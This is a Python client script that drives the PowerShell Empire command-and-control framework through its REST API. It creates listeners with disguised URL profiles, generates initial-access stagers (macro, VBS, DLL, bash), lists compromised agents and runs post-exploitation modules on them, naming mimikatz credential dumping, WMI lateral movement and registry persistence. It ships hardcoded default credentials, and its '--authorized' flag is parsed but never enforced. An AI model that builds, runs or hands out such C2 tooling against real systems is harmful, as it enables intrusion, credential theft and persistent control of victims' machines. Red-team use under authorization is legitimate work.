#!/usr/bin/env python3
"""
PowerShell Empire C2 Integration
Multi-language post-exploitation framework
Supports PowerShell, Python, and C# agents
"""

import subprocess
import requests
import json
import logging
from typing import Dict, List, Optional

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class EmpireC2Integration:
    """PowerShell Empire C2 framework integration"""
    
    def __init__(self, api_url: str = "https://localhost:1337", 
                 username: str = "empireadmin", password: str = "password123"):
        self.api_url = api_url.rstrip('/')
        self.username = username
        self.password = password
        self.token = None
    
    def check_installation(self) -> Dict[str, any]:
        """Check Empire installation"""
        result = {
            "installed": False,
            "running": False,
            "install_commands": [
                "git clone https://github.com/BC-SECURITY/Empire.git",
                "cd Empire",
                "./setup/install.sh",
                "# Start server:",
                "./ps-empire server",
                "# Start client:",
                "./ps-empire client"
            ]
        }
        
        try:
            response = requests.get(
                f"{self.api_url}/api/version",
                verify=False,
                timeout=5
            )
            if response.status_code in [200, 401]:
                result["installed"] = True
                result["running"] = True
        except Exception as e:
            logger.warning(f"Empire not running: {e}")
        
        return result
    
    def login(self) -> Dict[str, any]:
        """Authenticate with Empire API"""
        try:
            response = requests.post(
                f"{self.api_url}/api/admin/login",
                json={"username": self.username, "password": self.password},
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                self.token = response.json().get("token")
                return {"success": True, "token": self.token}
            return {"error": f"Login failed: {response.status_code}"}
        except Exception as e:
            return {"error": str(e)}
    
    def list_listeners(self) -> List[Dict[str, any]]:
        """List active listeners"""
        if not self.token:
            self.login()
        
        try:
            response = requests.get(
                f"{self.api_url}/api/listeners",
                headers={"Authorization": f"Bearer {self.token}"},
                verify=False,
                timeout=10
            )
            return response.json().get("listeners", []) if response.status_code == 200 else []
        except Exception as e:
            return []
    
    def create_listener(self, name: str = "http", listener_type: str = "http",
                       host: str = "0.0.0.0", port: int = 8080) -> Dict[str, any]:
        """
        Create HTTP/HTTPS listener
        
        Args:
            name: Listener name
            listener_type: http, https, onedrive, dropbox, etc.
            host: Bind host
            port: Bind port
        """
        if not self.token:
            self.login()
        
        listener_data = {
            "Name": name,
            "Host": f"http://{host}:{port}",
            "Port": port,
            "DefaultDelay": 5,
            "DefaultJitter": 0.0,
            "DefaultProfile": "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0"
        }
        
        try:
            response = requests.post(
                f"{self.api_url}/api/listeners/{listener_type}",
                headers={"Authorization": f"Bearer {self.token}"},
                json=listener_data,
                verify=False,
                timeout=10
            )
            return response.json() if response.status_code == 200 else {"error": response.text}
        except Exception as e:
            return {"error": str(e)}
    
    def list_stagers(self) -> List[str]:
        """List available stager types"""
        return [
            "multi/launcher",
            "windows/launcher_bat",
            "windows/launcher_vbs",
            "windows/macr",
            "windows/dll",
            "windows/ducky",
            "osx/launcher",
            "osx/ducky",
            "multi/bash"
        ]
    
    def generate_stager(self, stager_type: str = "multi/launcher", 
                       listener: str = "http", output_file: str = None) -> Dict[str, any]:
        """
        Generate stager for initial access
        
        Args:
            stager_type: Type of stager
            listener: Listener name
            output_file: Save stager to file
        """
        if not self.token:
            self.login()
        
        stager_data = {
            "Listener": listener,
            "OutFile": output_file or ""
        }
        
        try:
            response = requests.post(
                f"{self.api_url}/api/stagers/{stager_type}",
                headers={"Authorization": f"Bearer {self.token}"},
                json=stager_data,
                verify=False,
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                return {
                    "success": True,
                    "stager": result.get("Output", ""),
                    "type": stager_type
                }
            return {"error": response.text}
        except Exception as e:
            return {"error": str(e)}
    
    def list_agents(self) -> List[Dict[str, any]]:
        """List active agents/callbacks"""
        if not self.token:
            self.login()
        
        try:
            response = requests.get(
                f"{self.api_url}/api/agents",
                headers={"Authorization": f"Bearer {self.token}"},
                verify=False,
                timeout=10
            )
            return response.json().get("agents", []) if response.status_code == 200 else []
        except Exception as e:
            return []
    
    def execute_module(self, agent_name: str, module_name: str, 
                      params: Dict = None) -> Dict[str, any]:
        """
        Execute Empire module on agent
        
        Common modules:
        - credentials/mimikatz/logonpasswords
        - situational_awareness/network/powerview/get_domain_trust
        - lateral_movement/invoke_wmi
        - persistence/elevated/registry
        """
        if not self.token:
            self.login()
        
        module_data = {
            "Agent": agent_name,
            **(params or {})
        }
        
        try:
            response = requests.post(
                f"{self.api_url}/api/modules/{module_name}",
                headers={"Authorization": f"Bearer {self.token}"},
                json=module_data,
                verify=False,
                timeout=30
            )
            return response.json() if response.status_code == 200 else {"error": response.text}
        except Exception as e:
            return {"error": str(e)}
    
    def get_info(self) -> Dict[str, any]:
        """Get Empire framework information"""
        return {
            "name": "PowerShell Empire",
            "description": "Post-exploitation framework with multi-language agents",
            "maintainer": "BC Security",
            "features": [
                "PowerShell, Python, C# agents",
                "Multiple listener types (HTTP, HTTPS, Dropbox, OneDrive)",
                "Extensive module library (400+)",
                "Malleable C2 profiles",
                "Encrypted communications",
                "Plugin architecture",
                "AMSI bypass capabilities"
            ],
            "agent_types": {
                "PowerShell": "Windows agent with full .NET access",
                "Python": "Cross-platform agent",
                "C#": "Windows agent for .NET environments"
            },
            "listener_types": [
                "HTTP", "HTTPS", "OneDrive", "Dropbox", "Redirector"
            ],
            "module_categories": [
                "Credentials (Mimikatz, tokens, etc.)",
                "Lateral Movement (WMI, PSExec, etc.)",
                "Persistence (Registry, WMI, etc.)",
                "Privilege Escalation",
                "Situational Awareness (PowerView, etc.)",
                "Code Execution",
                "Collection",
                "Exfiltration"
            ],
            "notable_modules": [
                "credentials/mimikatz/logonpasswords - Extract credentials",
                "situational_awareness/network/powerview/* - AD enumeration",
                "lateral_movement/invoke_wmi - WMI execution",
                "persistence/elevated/registry - Registry persistence",
                "privesc/powerup/allchecks - Privilege escalation enum"
            ],
            "github": "https://github.com/BC-SECURITY/Empire",
            "default_port": 1337
        }


def main():
    """CLI interface"""
    import argparse
    
    parser = argparse.ArgumentParser(description="PowerShell Empire C2 Integration")
    parser.add_argument("--check", action="store_true", help="Check installation")
    parser.add_argument("--info", action="store_true", help="Show framework info")
    parser.add_argument("--api-url", default="https://localhost:1337", help="Empire API URL")
    parser.add_argument("--username", default="empireadmin", help="API username")
    parser.add_argument("--password", default="password123", help="API password")
    parser.add_argument("--listeners", action="store_true", help="List listeners")
    parser.add_argument("--agents", action="store_true", help="List agents")
    parser.add_argument("--stagers", action="store_true", help="List stager types")
    parser.add_argument("--generate-stager", help="Generate stager type")
    parser.add_argument("--listener-name", default="http", help="Listener name for stager")
    parser.add_argument('--authorized', action='store_true',
                       help='Confirm you have authorization to perform this action')
    args = parser.parse_args()
    
    empire = EmpireC2Integration(api_url=args.api_url, username=args.username, password=args.password)
    
    if args.check:
        status = empire.check_installation()
        print("\n═══ Empire Installation Status ═══")
        print(f"Installed: {status['installed']}")
        print(f"Running: {status['running']}")
        if not status['running']:
            print(f"\n📥 Installation Commands:")
            for cmd in status['install_commands']:
                print(f"   {cmd}")
    
    elif args.info:
        info = empire.get_info()
        print("\n═══ PowerShell Empire Framework ═══")
        print(f"Name: {info['name']}")
        print(f"Maintainer: {info['maintainer']}")
        print(f"Description: {info['description']}")
        print(f"\n🎯 Features:")
        for feature in info['features']:
            print(f"   • {feature}")
        print(f"\n🤖 Agent Types:")
        for agent, desc in info['agent_types'].items():
            print(f"   • {agent}: {desc}")
        print(f"\n📦 Notable Modules:")
        for module in info['notable_modules']:
            print(f"   • {module}")
        print(f"\n🔗 GitHub: {info['github']}")
    
    elif args.listeners:
        listeners = empire.list_listeners()
        print(f"\n📡 Active Listeners: {len(listeners)}")
        for listener in listeners:
            print(f"   • {listener.get('name', 'Unknown')}")
    
    elif args.agents:
        agents = empire.list_agents()
        print(f"\n🤖 Active Agents: {len(agents)}")
        for agent in agents:
            print(f"   • {agent.get('name', 'Unknown')} - {agent.get('hostname', 'N/A')}")
    
    elif args.stagers:
        stagers = empire.list_stagers()
        print(f"\n🚀 Available Stagers:")
        for stager in stagers:
            print(f"   • {stager}")
    
    elif args.generate_stager:
        print(f"\n🔨 Generating {args.generate_stager} stager...")
        result = empire.generate_stager(args.generate_stager, args.listener_name)
        if "success" in result:
            print(f"✅ Stager generated!")
            print(f"\n{result['stager']}")
        else:
            print(f"❌ Error: {result.get('error')}")
    
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
